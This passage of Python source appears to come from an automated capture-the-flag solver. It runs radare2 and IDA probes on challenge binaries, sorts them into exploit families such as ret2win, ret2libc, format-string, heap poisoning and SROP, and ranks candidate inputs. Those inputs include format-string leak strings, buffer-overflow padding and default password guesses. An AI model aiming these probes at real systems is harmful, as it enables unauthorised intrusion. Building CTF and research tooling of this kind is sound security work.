            artifact = artifact_root / "{0}_reverse_{1}.txt".format(binary_path.stem, index + 1)
            self.file_tool.write_text(artifact, text or json.dumps(payload, ensure_ascii=False, indent=2))
            memory.record_action("extract", "reverse-mcp task {0}".format(index + 1), "ok", payload.get("tool", "reverse analysis"), str(artifact))
            self._record_binary_mcp(binary_context, "{0}::{1}".format(payload.get("server", ""), payload.get("tool", "")))
            reports.append({"task": task, "server": payload.get("server", ""), "tool": payload.get("tool", ""), "artifact": str(artifact), "text": text[:16000]})
            if text:
                combined.append(text)
        return reports, "\n\n".join(combined)

    def _collect_local_binary_reports(self, binary_path, artifact_root, memory, category, binary_context, selected_analyzer=None):
        return self._collect_local_binary_reports_with_fallback(
            binary_path,
            artifact_root,
            memory,
            category,
            binary_context,
            selected_analyzer=selected_analyzer,
            allow_fallback_probe=False,
        )

    def _collect_local_binary_reports_with_fallback(
        self,
        binary_path,
        artifact_root,
        memory,
        category,
        binary_context,
        selected_analyzer=None,
        allow_fallback_probe=False,
    ):
        if not self.toolkit_tool or not self.toolkit_tool.is_configured():
            return [], ""
        if category not in {"pwn", "reverse"}:
            return [], ""

        reports = []
        combined = []
        analyzer_name = str((selected_analyzer or {}).get("analyzer_name", "") or "").lower()
        allow_radare2 = analyzer_name in {"", "radare2"} or allow_fallback_probe
        if self.toolkit_tool.has_tool("radare2") and allow_radare2:
            result = self.toolkit_tool.run_radare2_probe(binary_path, timeout=25)
            artifact = artifact_root / "{0}_radare2_probe.json".format(binary_path.stem)
            self.file_tool.write_json(artifact, result)
            text = str(result.get("stdout", "") or "").strip()
            if text:
                text_artifact = artifact_root / "{0}_radare2_probe.txt".format(binary_path.stem)
                self.file_tool.write_text(text_artifact, text)
            status = result.get("status", "error")
            details = result.get("message", "") or "bounded radare2 probe"
            memory.record_action("extract", "radare2 quick probe", status, details, str(artifact))
            if status == "ok":
                self._record_binary_tool(binary_context, "radare2")
                reports.append(
                    {
                        "task": "bounded radare2 probe",
                        "server": "local-toolkit",
                        "tool": "radare2",
                        "artifact": str(artifact),
                        "text": text[:16000],
                    }
                )
                if text:
                    combined.append(text)
        elif allow_fallback_probe and self.toolkit_tool.has_tool("radare2"):
            memory.record_action(
                "extract",
                "fallback local analyzer probe",
                "warn",
                "local radare2 probe was requested as fallback but did not run",
            )
        elif analyzer_name and analyzer_name not in {"strings", "radare2"}:
            memory.record_action(
                "extract",
                "skip local analyzer probe",
                "ok",
                "selected analyzer {0} suppresses redundant local radare2 probing".format(analyzer_name),
            )
        return reports, "\n\n".join(combined)

    def _collect_binary_analysis_reports(
        self,
        binary_path,
        artifact_root,
        memory,
        category,
        binary_context,
        strings_text,
        selected_analyzer,
        existing_reports=None,
    ):
        analyzer_name = str((selected_analyzer or {}).get("analyzer_name", "") or "").lower()
        strategy = {
            "analyzer": dict(selected_analyzer or {}),
            "order": [],
            "skipped": [],
            "fallback_used": False,
            "reason": "",
        }
        reports = []
        seen_artifacts = {
            str(item.get("artifact", "") or "")
            for item in list(existing_reports or [])
            if isinstance(item, dict) and item.get("artifact")
        }
        text_chunks = []
        prefer_local_first = analyzer_name in {"radare2", "strings"}
        if prefer_local_first:
            strategy["order"].append("local")
            local_reports, local_text = self._collect_local_binary_reports_with_fallback(
                binary_path,
                artifact_root,
                memory,
                category,
                binary_context,
                selected_analyzer=selected_analyzer,
                allow_fallback_probe=False,
            )
            reports.extend(self._filter_new_reports(local_reports, seen_artifacts))
            seen_artifacts.update(str(item.get("artifact", "") or "") for item in local_reports if item.get("artifact"))
            if local_text:
                text_chunks.append(local_text)
            if self._analysis_probe_sufficient(category, strings_text, local_text, analyzer_name):
                strategy["skipped"].append("reverse-mcp")
                strategy["reason"] = "selected local analyzer produced enough signal to skip reverse MCP"
                memory.record_action("extract", "skip reverse mcp", "ok", strategy["reason"])
            else:
                strategy["fallback_used"] = True
                strategy["order"].append("reverse-mcp")
                reverse_reports, reverse_text = self._collect_reverse_reports(binary_path, artifact_root, memory, category, binary_context)
                reports.extend(self._filter_new_reports(reverse_reports, seen_artifacts))
                if reverse_text:
                    text_chunks.append(reverse_text)
        else:
            strategy["order"].append("reverse-mcp")
            reverse_reports, reverse_text = self._collect_reverse_reports(binary_path, artifact_root, memory, category, binary_context)
            reports.extend(self._filter_new_reports(reverse_reports, seen_artifacts))
            seen_artifacts.update(str(item.get("artifact", "") or "") for item in reverse_reports if item.get("artifact"))
            if reverse_text:
                text_chunks.append(reverse_text)
            if self._analysis_probe_sufficient(category, strings_text, reverse_text, analyzer_name):
                strategy["skipped"].append("local")
                strategy["reason"] = "selected sidecar analyzer produced enough signal to skip fallback local probe"
                memory.record_action("extract", "skip local analyzer fallback", "ok", strategy["reason"])
            else:
                strategy["fallback_used"] = True
                strategy["order"].append("local")
                local_reports, local_text = self._collect_local_binary_reports_with_fallback(
                    binary_path,
                    artifact_root,
                    memory,
                    category,
                    binary_context,
                    selected_analyzer=selected_analyzer,
                    allow_fallback_probe=True,
                )
                reports.extend(self._filter_new_reports(local_reports, seen_artifacts))
                if local_text:
                    text_chunks.append(local_text)
        combined_text = "\n\n".join([item for item in text_chunks if item])
        strategy["report_count"] = len(reports)
        strategy["signal_score"] = self._analysis_probe_score(category, strings_text, combined_text)
        return {"reports": reports, "text": combined_text, "strategy": strategy}

    def _filter_new_reports(self, reports, seen_artifacts):
        filtered = []
        for item in list(reports or []):
            artifact = str((item or {}).get("artifact", "") or "")
            if artifact and artifact in seen_artifacts:
                continue
            filtered.append(item)
        return filtered

    def _analysis_probe_score(self, category, strings_text, analyzer_text):
        combined = "\n".join([str(strings_text or ""), str(analyzer_text or "")]).lower()
        if not combined.strip():
            return 0
        if category == "pwn":
            markers = [
                "win",
                "flag",
                "/bin/sh",
                "system",
                "printf",
                "%p",
                "%n",
                "gets",
                "overflow",
                "canary",
                "pie",
                "nx",
                "relro",
                "rop",
            ]
        else:
            markers = [
                "flag",
                "correct",
                "wrong",
                "strcmp",
                "memcmp",
                "xor",
                "decode",
                "rot",
                "table",
                "vm",
                "opcode",
                "serial",
                "license",
                "patch",
            ]
        score = sum(1 for token in markers if token in combined)
        score += min(4, len([line for line in combined.splitlines() if line.strip()]) // 25)
        return score

    def _analysis_probe_sufficient(self, category, strings_text, analyzer_text, analyzer_name):
        score = self._analysis_probe_score(category, strings_text, analyzer_text)
        analyzer_name = str(analyzer_name or "").lower()
        text = "\n".join([str(strings_text or ""), str(analyzer_text or "")]).lower()
        if category == "pwn":
            if any(token in text for token in ["ret2win", " win", "print_flag", "get_flag", "format string", "%p", "%n", "/bin/sh"]):
                return True
            return score >= (2 if analyzer_name in {"radare2", "strings"} else 3)
        if any(token in text for token in ["flag{", "correct", "wrong", "strcmp", "memcmp", "xor", "opcode", "patch"]):
            return True
        return score >= (3 if analyzer_name else 4)

    def _analyzer_changed(self, current_analyzer, refined_analyzer):
        current = str((current_analyzer or {}).get("analyzer_name", "") or "").lower()
        refined = str((refined_analyzer or {}).get("analyzer_name", "") or "").lower()
        current_mode = str((current_analyzer or {}).get("analyzer_mode", "") or "").lower()
        refined_mode = str((refined_analyzer or {}).get("analyzer_mode", "") or "").lower()
        return current != refined or current_mode != refined_mode

    def _ensure_reverse_mcp_live(self, binary_path, memory):
        if not self.mcp_registry:
            return {"status": "unavailable", "message": "reverse MCP registry is not configured"}
        descriptor = self.mcp_registry.pick_reverse_tool()
        if not descriptor:
            return {"status": "unavailable", "message": "no reverse MCP tool is available"}

        server_name = str(descriptor.get("server", "") or "")
        tool_name = str((descriptor.get("tool") or {}).get("name", "") or "")
        haystack = "{0} {1}".format(server_name, tool_name).lower()
        if "ida" not in haystack:
            return {"status": "skipped", "message": "selected reverse MCP is not IDA-backed"}

        probe = self.mcp_registry.call_tool_safe(server_name, "check_connection", arguments={}, timeout=10)
        probe_text = self.mcp_registry.flatten_tool_result(probe.get("result") if probe.get("ok") else probe.get("error"))
        if probe.get("ok") and "Successfully connected to IDA Pro" in probe_text:
            memory.record_action("extract", "probe ida live", "ok", probe_text)
            return {"status": "connected", "launched": False, "message": probe_text}

        if not self.toolkit_tool:
            memory.record_action("extract", "probe ida live", "warn", probe_text or "IDA MCP is idle and no toolkit launcher is configured")
            return {"status": "idle", "launched": False, "message": probe_text}

        launch = self.toolkit_tool.launch_ida_live(binary_path, headless=True)
        if launch.get("status") != "ok":
            memory.record_action("extract", "launch ida live", launch.get("status", "error"), launch.get("message", "launcher failed"))
            return {"status": "error", "launched": False, "message": launch.get("message", "")}

        memory.record_action("extract", "launch ida live", "ok", launch.get("command_preview", ""))
        final_text = probe_text
        final_status = "idle"
        for _ in range(20):
            time.sleep(1.0)
            retry = self.mcp_registry.call_tool_safe(server_name, "check_connection", arguments={}, timeout=10)
            retry_text = self.mcp_registry.flatten_tool_result(retry.get("result") if retry.get("ok") else retry.get("error"))
            final_text = retry_text or final_text
            if retry.get("ok") and "Successfully connected to IDA Pro" in retry_text:
                final_status = "connected"
                memory.record_action("extract", "verify ida live", "ok", retry_text)
                break
        else:
            memory.record_action("extract", "verify ida live", "warn", final_text or "IDA live connection is still idle after launch")

        return {
            "status": final_status,
            "launched": True,
            "message": final_text,
            "launcher": launch,
        }

    def _reverse_tasks(self, category):
        if category == "pwn":
            return [
                "Summarize protections, imported functions, and any obvious ret2win, format-string, overflow, or shellcode path.",
                "Highlight symbols, strings, and branches that directly mention win, shell, flag, or auth success paths.",
            ]
        return [
            "Summarize the input validation path, key strings, compare branches, and any direct flag recovery opportunity.",
            "Identify xor/rot/table transforms, vm-lite hints, patch points, and the most likely candidate input path.",
        ]

    def _classify_binary(self, category, primary_binary, strings_text, reverse_text, source_text):
        text = "\n".join([strings_text or "", reverse_text or "", source_text or ""]).lower()
        if category == "pwn":
            if any(token in text for token in ["%p", "%s", "format string", "printf(", "vprintf", "fprintf"]):
                return {"subtype": "format-string", "summary": "Format-string style clues dominate the binary surface."}
            if any(token in text for token in [" win", "win(", "ret2win", "give_flag", "print_flag", "get_flag"]):
                return {"subtype": "ret2win", "summary": "An obvious win/flag path exists and should be probed first."}
            if any(token in text for token in ["/bin/sh", "execve", "shellcode", "mprotect"]):
                return {"subtype": "shellcode", "summary": "Shell or shellcode clues dominate the candidate exploit path."}
            if any(token in text for token in ["malloc", "free", "unlink", "tcache", "fastbin"]):
                return {"subtype": "heap-hint", "summary": "Heap-oriented indicators exist; keep a heap plan in reserve."}
            if any(token in text for token in ["gets", "read(", "fgets", "overflow", "stack", "__stack_chk_fail"]):
                return {"subtype": "stack-overflow", "summary": "Stack-input routines suggest a classic overwrite path."}
            return {"subtype": "rop", "summary": "Default to a ROP-oriented binary workflow when no easier path is obvious."}
        if any(token in text for token in ["vm", "opcode", "bytecode", "dispatch", "instruction"]):
            return {"subtype": "vm-lite", "summary": "The binary looks like a lightweight VM or state-machine validator."}
        if any(token in text for token in ["xor", "decode", "decrypt", "key stream", "keystream"]):
            return {"subtype": "xor-transform", "summary": "A lightweight xor/decode transform is the most likely reverse path."}
        if any(token in text for token in ["rot", "table", "lookup", "sbox"]):
            return {"subtype": "rot-or-table", "summary": "Rotation or lookup-table logic appears in the validation path."}
        if any(token in text for token in ["argv", "usage:", "usage ", "argc", "command line"]):
            return {"subtype": "argv-check", "summary": "The binary appears to validate command-line input or argv values."}
        if any(token in text for token in ["patch", "license", "serial", "bypass"]):
            return {"subtype": "patch-bypass", "summary": "This looks like a patch-or-bypass style reverse problem."}
        if primary_binary.get("binary_kind") in {"script", "jar", "apk"}:
            return {"subtype": "managed-or-scripted", "summary": "The sample looks managed or scripted; prefer direct logic recovery."}
        return {"subtype": "string-check", "summary": "A direct string/compare check is the most likely reverse path."}

    def _classify_pwn_family(self, classification, protections, strings_text, reverse_text, source_text, pwn_probe, angr_probe):
        classification = dict(classification or {})
        protections = dict(protections or {})
        pwn_probe = dict(pwn_probe or {})
        angr_probe = dict(angr_probe or {})
        subtype = str(classification.get("subtype") or "").strip().lower()
        summary = str(classification.get("summary") or "").strip()
        function_names = [str(item or "").strip() for item in list(pwn_probe.get("functions") or []) if str(item or "").strip()]
        import_names = [str(item or "").strip() for item in list(pwn_probe.get("imports") or []) if str(item or "").strip()]
        probe_strings = [str(item or "").strip() for item in list(pwn_probe.get("interesting_strings") or []) if str(item or "").strip()]
        fmt_clues = [str(item or "").strip() for item in list(pwn_probe.get("fmt_clues") or []) if str(item or "").strip()]
        rop_hints = [str(item or "").strip() for item in list(pwn_probe.get("rop_hints") or []) if str(item or "").strip()]
        ret2libc_plans = [dict(item) for item in list(pwn_probe.get("ret2libc_plans") or []) if isinstance(item, dict)]
        raw_payloads = [dict(item) for item in list(pwn_probe.get("raw_payloads") or []) if isinstance(item, dict)]
        combined_text = "\n".join(
            [
                strings_text or "",
                reverse_text or "",
                source_text or "",
                "\n".join(function_names),
                "\n".join(import_names),
                "\n".join(probe_strings),
                "\n".join(fmt_clues),
                "\n".join(rop_hints),
                summary,
            ]
        )
        lowered = combined_text.lower()
        import_blob = "\n".join(import_names).lower()
        function_blob = "\n".join(function_names).lower()
        string_blob = "\n".join(probe_strings).lower()
        relro = str(protections.get("relro") or "").strip().lower()
        nx = str(protections.get("nx") or "").strip().lower()
        pie = str(protections.get("pie") or "").strip().lower()
        family_map = {}

        def add_signal(family, weight, source="", value="", blocker=""):
            family = str(family or "").strip().lower()
            if not family:
                return
            entry = family_map.setdefault(
                family,
                {
                    "family": family,
                    "confidence": 0.0,
                    "evidence": [],
                    "blockers": [],
                },
            )
            entry["confidence"] += float(weight or 0.0)
            if source and value:
                entry["evidence"].append({"source": str(source), "value": str(value)[:200]})
            if blocker:
                entry["blockers"].append(str(blocker))

        def has_any(tokens, haystack=None):
            target = lowered if haystack is None else str(haystack or "").lower()
            return any(str(token or "").lower() in target for token in list(tokens or []))

        def dedupe_evidence(values):
            items = []
            seen = set()
            for item in list(values or []):
                marker = "{0}:{1}".format(str(item.get("source") or "").lower(), str(item.get("value") or "").lower())
                if marker in seen:
                    continue
                seen.add(marker)
                items.append({"source": str(item.get("source") or ""), "value": str(item.get("value") or "")})
            return items[:10]

        def dedupe_strings(values):
            items = []
            seen = set()
            for value in list(values or []):
                marker = str(value or "").strip().lower()
                if not marker or marker in seen:
                    continue
                seen.add(marker)
                items.append(str(value).strip())
            return items[:6]

        if subtype == "format-string" or fmt_clues or has_any(["%p", "%s", "%n", "format string"]):
            add_signal("format-string", 0.7, "subtype", subtype or "format-string")
        for clue in fmt_clues[:4]:
            add_signal("format-string", 0.08, "fmt", clue)
        if ret2libc_plans:
            add_signal("ret2libc", 0.92, "probe", "ret2libc_plans={0}".format(len(ret2libc_plans)))
        if subtype == "ret2win" or list(pwn_probe.get("ret2win_targets") or []):
            add_signal("ret2win", 0.88, "subtype", subtype or "ret2win")
        if subtype == "stack-overflow" or bool(angr_probe.get("solved")):
            add_signal("stack-overflow", 0.66, "subtype", subtype or "stack-overflow")
        if subtype == "rop" or any(str(item.get("kind") or "").startswith("rop") for item in raw_payloads):
            add_signal("rop", 0.72, "probe", "raw_rop_payloads")
        if subtype == "shellcode":
            add_signal("shellcode-mmap", 0.62, "subtype", subtype)
        if subtype == "heap-hint":
            add_signal("heap-hint", 0.46, "subtype", subtype)

        if has_any(["use after free", "uaf", "dangling pointer", "after free"]):
            add_signal("heap-uaf", 0.84, "strings", "uaf")
        if has_any(["double free", "double-free", "free(): double free", "doublefree"]):
            add_signal("heap-double-free", 0.9, "strings", "double free")
        if has_any(["tcache", "__free_hook", "__malloc_hook", "tcache_perthread_struct", "poison"]):
            add_signal("heap-tcache-poison", 0.82, "strings", "tcache")
        if has_any(["unsorted bin", "main_arena", "bk", "fd"]):
            add_signal("heap-unsorted-bin", 0.76, "strings", "unsorted bin")
        if has_any(["seccomp", "prctl", "seccomp-tools", "no new privs"]):
            add_signal("seccomp-orw", 0.78, "strings", "seccomp")
        if has_any(["openat", "open", "read", "write", "orw"]) and has_any(["seccomp", "prctl", "sandbox"]):
            add_signal("seccomp-orw", 0.12, "syscalls", "open/read/write")
        if has_any(["sandbox", "open/read/write", "read flag", "openat"]) and not has_any(["seccomp", "prctl"]):
            add_signal("sandbox-orw", 0.72, "strings", "sandbox")
        if has_any(["sigreturn", "rt_sigreturn", "sigreturn frame", "ucontext"]) or has_any(["syscall; ret", "syscall", "setcontext"]):
            add_signal("srop", 0.82, "gadgets", "sigreturn/syscall")
        if has_any(["_io_2_1_stdout_", "_io_2_1_stderr_", "_io_file", "_io_wide_data", "_io_list_all", "vtable"]):
            add_signal("fsop", 0.86, "strings", "_IO_")
        if has_any(["mmap", "mprotect", "rwx", "shellcode", "jit"]) or (nx == "disabled" and has_any(["shellcode"])):
            add_signal("shellcode-mmap", 0.8, "strings", "mmap/mprotect")
        if has_any(["ret2dlresolve", "_dl_runtime_resolve", "dl-resolve", "link_map", "r_info"]):
            add_signal("ret2dlresolve", 0.84, "strings", "ret2dlresolve")
        elif subtype in {"rop", "stack-overflow"} and ("full" not in relro) and (not has_any(["static"], pie)):
            add_signal("ret2dlresolve", 0.48, "protections", "relro={0}".format(relro or "unknown"))

        if has_any(["malloc", "free"], import_blob) or has_any(["malloc", "free"], function_blob):
            if "heap-hint" in family_map:
                add_signal("heap-hint", 0.08, "imports", "malloc/free")
            if any(name.startswith("heap-") for name in family_map):
                add_signal("heap-uaf", 0.04, "imports", "malloc/free")
        if has_any(["_io_2_1_stdout_", "_io_file"], string_blob):
            add_signal("fsop", 0.08, "probe_strings", "_IO_")
        if has_any(["seccomp", "openat", "read", "write"], import_blob + "\n" + function_blob):
            add_signal("seccomp-orw", 0.08, "imports", "seccomp/open/read/write")
        if has_any(["syscall", "sigreturn"], import_blob + "\n" + function_blob):
            add_signal("srop", 0.08, "imports", "syscall/sigreturn")

        for family, blocker in [
            ("seccomp-orw", "missing explicit open/read/write or seccomp surface"),
            ("sandbox-orw", "missing explicit sandbox/open-read-write surface"),
            ("srop", "missing syscall/sigreturn evidence"),
            ("fsop", "missing _IO_/FILE structure evidence"),
            ("ret2dlresolve", "full RELRO or no dynamic resolver clues may block ret2dlresolve"),
        ]:
            if family not in family_map:
                continue
            if family == "seccomp-orw" and not has_any(["open", "openat", "read", "write", "seccomp", "prctl"]):
                add_signal(family, 0.0, blocker=blocker)
            if family == "sandbox-orw" and not has_any(["sandbox", "open", "openat", "read", "write"]):
                add_signal(family, 0.0, blocker=blocker)
            if family == "srop" and not has_any(["sigreturn", "syscall", "rt_sigreturn", "setcontext"]):
                add_signal(family, 0.0, blocker=blocker)
            if family == "fsop" and not has_any(["_io_", "stdout", "stderr", "vtable"]):
                add_signal(family, 0.0, blocker=blocker)
            if family == "ret2dlresolve" and "full" in relro:
                add_signal(family, 0.0, blocker=blocker)

        candidates = []
        for entry in family_map.values():
            family = str(entry.get("family") or "")
            blockers = dedupe_strings(entry.get("blockers") or [])
            confidence = round(max(0.0, min(float(entry.get("confidence", 0.0) or 0.0), 0.99)), 4)
            if family == "heap-hint" and confidence < 0.55:
                continue
            candidates.append(
                {
                    "family": family,
                    "confidence": confidence,
                    "evidence": dedupe_evidence(entry.get("evidence") or []),
                    "blockers": blockers,
                }
            )
        candidates.sort(key=lambda item: (-float(item.get("confidence", 0.0) or 0.0), item.get("family", "")))
        if not candidates:
            fallback_family = subtype or "rop"
            candidates = [
                {
                    "family": fallback_family,
                    "confidence": 0.58,
                    "evidence": [{"source": "subtype", "value": fallback_family}],
                    "blockers": [],
                }
            ]
        selected = dict(candidates[0])
        return {
            "family": str(selected.get("family") or subtype or "rop"),
            "confidence": float(selected.get("confidence", 0.0) or 0.0),
            "evidence": list(selected.get("evidence") or []),
            "blockers": list(selected.get("blockers") or []),
            "candidates": candidates[:6],
        }

    def _seed_pwn_stage_status(self, family, family_evidence, pwn_probe):
        family = str(family or "").strip().lower()
        family_evidence = list(family_evidence or [])
        pwn_probe = dict(pwn_probe or {})
        status = {
            "status": "classified-only" if family else "unknown",
            "family": family,
            "source_lane": "classification",
            "summary": "classified exploit family" if family else "no family selected",
            "constraints": [],
            "blockers": [],
            "leak_artifacts": [],
            "resolved_libc_context": {},
            "stage1_payload": {},
            "stage2_payload": {},
            "exploit_transcript": {},
        }
        for item in family_evidence[:6]:
            source = str((item or {}).get("source") or "").strip()
            value = str((item or {}).get("value") or "").strip()
            if source or value:
                status["constraints"].append("{0}:{1}".format(source or "evidence", value))
        ret2libc_plans = [dict(item) for item in list(pwn_probe.get("ret2libc_plans") or []) if isinstance(item, dict)]
        if ret2libc_plans:
            first_plan = dict(ret2libc_plans[0])
            status["status"] = "stage1-ready"
            status["source_lane"] = "remote-pwn-probe"
            status["summary"] = "stage1 leak plan extracted from remote probe"
            status["leak_artifacts"] = [
                {
                    "kind": "ret2libc-plan",
                    "label": str(first_plan.get("label") or ""),
                    "leak_symbol": str(first_plan.get("leak_symbol") or ""),
                    "leak_function": str(first_plan.get("leak_function") or ""),
                }
            ]
            status["resolved_libc_context"] = {
                "leak_symbol": str(first_plan.get("leak_symbol") or ""),
                "leak_got": str(first_plan.get("leak_got") or ""),
                "return_to": str(first_plan.get("return_to") or ""),
            }
            status["stage1_payload"] = {
                "label": str(first_plan.get("label") or ""),
                "kind": str(first_plan.get("kind") or "ret2libc"),
                "preview": str(first_plan.get("stage1_b64") or "")[:96],
            }
        return status

    def _collect_interesting_symbols(self, strings_text, reverse_text, category):
        lines = []
        haystack = "\n".join([strings_text or "", reverse_text or ""])
        keyword_pool = self.PWN_SYMBOL_HINTS if category == "pwn" else self.REVERSE_HINTS
        for line in haystack.splitlines():
            cleaned = line.strip()
            if not cleaned:
                continue
            lowered = cleaned.lower()
            if any(token in lowered for token in keyword_pool):
                lines.append(cleaned[:240])
            elif len(cleaned) <= 80 and any(ch.isupper() for ch in cleaned) and self.BINARY_PROTOCOL_PATTERN.search(cleaned):
                lines.append(cleaned[:240])
        deduped = []
        seen = set()
        for item in lines:
            marker = item.lower()
            if marker in seen:
                continue
            seen.add(marker)
            deduped.append(item)
        return deduped[:40]

    def _collect_decoded_candidates(self, text, artifact_root, stem, memory):
        candidates = []
        seen = set()
        for match in self.BASE64_PATTERN.findall(text or "")[:80]:
            decoded = self._safe_base64_decode(match)
            if not decoded:
                continue
            key = ("base64", decoded)
            if key in seen:
                continue
            seen.add(key)
            candidates.append({"codec": "base64", "value": decoded, "score": self._score_text_like(decoded)})
        for match in self.HEX_PATTERN.findall(text or "")[:80]:
            decoded = self._safe_hex_decode(match)
            if not decoded:
                continue
            key = ("hex", decoded)
            if key in seen:
                continue
            seen.add(key)
            candidates.append({"codec": "hex", "value": decoded, "score": self._score_text_like(decoded)})
        candidates = sorted(candidates, key=lambda item: (item.get("score", 0.0), len(item.get("value", ""))), reverse=True)
        if candidates:
            self.file_tool.write_json(artifact_root / "{0}_decoded_candidates.json".format(stem), candidates[:40])
            memory.record_action("extract", "decode candidates", "ok", "generated bounded decode candidates")
        return candidates

    def _safe_base64_decode(self, value):
        raw = str(value or "").strip()
        if len(raw) % 4:
            raw += "=" * (4 - (len(raw) % 4))
        try:
            decoded = base64.b64decode(raw, validate=False)
        except Exception:
            return ""
        return decoded.decode("utf-8", errors="replace").strip()

    def _safe_hex_decode(self, value):
        raw = str(value or "").strip().lower()
        if raw.startswith("0x"):
            raw = raw[2:]
        if len(raw) % 2:
            return ""
        try:
            decoded = binascii.unhexlify(raw)
        except Exception:
            return ""
        return decoded.decode("utf-8", errors="replace").strip()

    def _score_text_like(self, value):
        text = str(value or "").strip()
        if not text:
            return 0.0
        printable = sum(1 for item in text if 32 <= ord(item) < 127)
        alpha = sum(1 for item in text if item.isalnum() or item in "_-{}:/")
        score = (printable / max(1, len(text))) * 0.5 + (alpha / max(1, len(text))) * 0.4
        if self.verifier.discover_from_text(text):
            score += 0.5
        if any(token in text.lower() for token in ["flag", "correct", "secret", "token", "key", "password"]):
            score += 0.15
        return round(min(score, 1.0), 4)

    def _collect_candidate_inputs(self, category, subtype, strings_text, reverse_text, source_text, decoded_candidates, selected_analyzer=None):
        candidates = []
        analyzer_name = str((selected_analyzer or {}).get("analyzer_name", "") or "").lower()
        analyzer_lane = str((selected_analyzer or {}).get("lane", "") or "").lower()
        analyzer_mode = str((selected_analyzer or {}).get("analyzer_mode", "") or "").lower()

        def adjusted_confidence(base_confidence, source, value=""):
            confidence = float(base_confidence)
            lowered_source = str(source or "").lower()
            lowered_value = str(value or "").lower()
            if category == "pwn":
                if analyzer_name == "radare2":
                    if lowered_source == subtype:
                        confidence += 0.08
                    if any(token in lowered_value for token in ["ret2win", "win", "%p", "%n", "/bin/sh"]):
                        confidence += 0.06
                elif analyzer_lane == "sidecar":
                    if lowered_source in {"hint-regex", "quoted-string"}:
                        confidence -= 0.04
            else:
                if analyzer_lane == "sidecar":
                    if lowered_source in {"base64", "hex", subtype, "analyzer-hint", "analyzer-quoted"}:
                        confidence += 0.08
                    if any(token in lowered_value for token in ["flag", "correct", "wrong", "secret", "open", "xor", "opcode"]):
                        confidence += 0.06
                elif analyzer_name == "strings":
                    if lowered_source in {"quoted-string", "hint-regex"}:
                        confidence += 0.03
            return round(max(0.0, min(confidence, 0.99)), 4)

        def push(value, source, confidence):
            text = str(value or "").strip()
            if not text or len(text) > 128:
                return
            if text in {"flag", "password", "token"}:
                return
            candidates.append({"value": text, "source": source, "confidence": adjusted_confidence(confidence, source, text)})
        combined = "\n".join([strings_text or "", reverse_text or "", source_text or ""])
        for match in self.INPUT_HINT_PATTERN.findall(combined):
            push(match, "hint-regex", 0.88)
        for match in self.QUOTED_STRING_PATTERN.findall(combined):
            if len(match) >= 5 and any(ch.isalpha() for ch in match):
                push(match, "quoted-string", 0.54)
        if analyzer_lane == "sidecar" and reverse_text:
            analyzer_hint_hits = set()
            for line in str(reverse_text or "").splitlines():
                cleaned = line.strip()
                lowered = cleaned.lower()
                if not cleaned:
                    continue
                if any(token in lowered for token in ["flag", "correct", "wrong", "secret", "decode", "xor", "opcode", "patch"]):
                    analyzer_hint_hits.add(cleaned[:80])
                for match in self.QUOTED_STRING_PATTERN.findall(cleaned):
                    if len(match) >= 4 and any(ch.isalpha() for ch in match):
                        analyzer_hint_hits.add(match[:80])
            for item in sorted(analyzer_hint_hits)[:10]:
                push(item, "analyzer-hint" if item == item.strip() else "analyzer-quoted", 0.62)
        for item in decoded_candidates[:20]:
            value = item.get("value", "")
            if not value:
                continue
            if "\n" in value:
                for line in value.splitlines():
                    if 3 <= len(line.strip()) <= 80:
                        push(line.strip(), item.get("codec", "decoded"), item.get("score", 0.5))
            else:
                push(value, item.get("codec", "decoded"), item.get("score", 0.5))
        if category == "pwn":
            for value, confidence in [("RET2WIN", 0.96), ("win", 0.72), ("%p.%p.%p", 0.84), ("%7$p", 0.82), ("%7$s", 0.81), ("A" * 64, 0.7), ("A" * 128, 0.68), ("A" * 256, 0.66)]:
                push(value, subtype, confidence)
        else:
            for value, confidence in [("opensesame", 0.52), ("password", 0.48), ("admin", 0.46), ("secret", 0.44)]:
                push(value, subtype, confidence)
        ranked = sorted(candidates, key=lambda item: (item["confidence"], len(item["value"])), reverse=True)
        deduped = []
        seen = set()
        for item in ranked:
            marker = item["value"].lower()
            if marker in seen:
                continue
            seen.add(marker)
            deduped.append(item)
        return deduped[:14]

    def _select_remote_host(self, challenge, category):
        if not self.remote_tool:
            return {"selected_host": "", "reason": "remote helper layer unavailable", "selection_mode": "none", "candidates": []}
        preferred = (challenge.metadata or {}).get("use_remote_host") or ""
        target = challenge.target or ""
        if not target and challenge.attachments:
            target = str(challenge.attachments[0])
        return self.remote_tool.recommend_host(category=category, target=target, preferred=preferred)

    def _prepare_remote_context(self, challenge, workspace, binary_path, remote_selection, remote_reports, memory, prebuilt_remote_context=None, primary_binary=None):
        primary_binary = dict(primary_binary or {})
        prebuilt_remote_context = dict(prebuilt_remote_context or {})
        if prebuilt_remote_context and str(primary_binary.get("remote_binary_path") or "").strip():
            prebuilt_remote_context["binary_path"] = str(primary_binary.get("remote_binary_path") or "").strip()
            return prebuilt_remote_context
        host_name = str(remote_selection.get("selected_host") or "").strip()
        if not host_name or not self.remote_tool:
            return {}
        probe = self.remote_tool.probe(host_name, timeout=18)
        probe["kind"] = "probe"
        remote_reports.append(probe)
        self.file_tool.write_json(workspace / "artifacts" / "{0}_{1}_remote_probe.json".format(binary_path.stem, host_name), probe)
        memory.record_action("extract", "probe remote host {0}".format(host_name), probe.get("status", "error"), probe.get("message", "remote probe"))
        if probe.get("status") != "ok":
            return {}
        remote_workspace = self.remote_tool.ensure_workspace(
            host_name,
            run_id=challenge.metadata.get("run_id") or workspace.name,
            timeout=20,
        )
        remote_workspace["kind"] = "workspace"
        remote_reports.append(remote_workspace)
        self.file_tool.write_json(workspace / "artifacts" / "{0}_{1}_remote_workspace.json".format(binary_path.stem, host_name), remote_workspace)
        memory.record_action("extract", "ensure remote workspace {0}".format(host_name), remote_workspace.get("status", "error"), remote_workspace.get("message", "remote workspace prepared"))
        if remote_workspace.get("status") != "ok":
            return {}
        remote_input_dir = remote_workspace.get("input_dir") or remote_workspace.get("workspace_root") or "/tmp"
        remote_binary_path = "{0}/{1}".format(remote_input_dir.rstrip("/"), binary_path.name)
        upload = self.remote_tool.upload(host_name, binary_path, remote_path=remote_binary_path, timeout=45)
        upload["kind"] = "upload"
        remote_reports.append(upload)
        self.file_tool.write_json(workspace / "artifacts" / "{0}_{1}_remote_upload.json".format(binary_path.stem, host_name), upload)
        memory.record_action("extract", "upload sample to {0}".format(host_name), upload.get("status", "error"), upload.get("message", "remote upload"))
        if upload.get("status") != "ok":
            return {}
        return {
            "host": host_name,
            "workspace": remote_workspace,
            "binary_path": upload["remote_path"],
            "probe": probe,
            "pwn_capabilities": dict(probe.get("pwn_capabilities") or {}),
        }

